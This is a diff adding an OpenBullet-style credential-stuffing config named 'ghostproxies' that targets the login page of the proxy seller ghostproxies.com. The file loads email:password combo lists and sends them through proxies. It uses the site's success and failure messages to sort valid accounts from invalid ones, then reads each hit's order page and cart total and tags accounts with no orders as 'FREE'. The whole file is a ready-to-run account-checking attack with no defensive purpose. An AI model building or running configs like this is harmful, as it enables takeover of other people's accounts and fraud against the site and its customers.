@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "ghostproxies",
+  "SuggestedBots": 30,
+  "LastModified": "2019-03-01T19:10:16.8841947+01:00",
+  "AdditionalInfo": "",
+  "Author": "Hassanxx",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://ghostproxies.com/login" AutoRedirect=FALSE 
+  CONTENT "_method=POST&data%5BUser%5D%5Bemail%5D=<USER>&data%5BUser%5D%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://ghostproxies.com" 
+  HEADER "Referer: https://ghostproxies.com/login" 
+#FailKey KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password." 
+#GET_LOGIN REQUEST GET "https://ghostproxies.com/orders" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#SuccKey KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Log out" 
+#MY_PAGE REQUEST GET "https://ghostproxies.com/orders/cart" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#capture PARSE "<SOURCE>" LR "<div class=\"total-price-container\">$<div class=\"total-price price\">" "</div><div class=\"savings\"></div></div>" Recursive=FALSE -> VAR "Total Due Today" "" "" 
+#Free_Key KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "There are no orders in your account." 
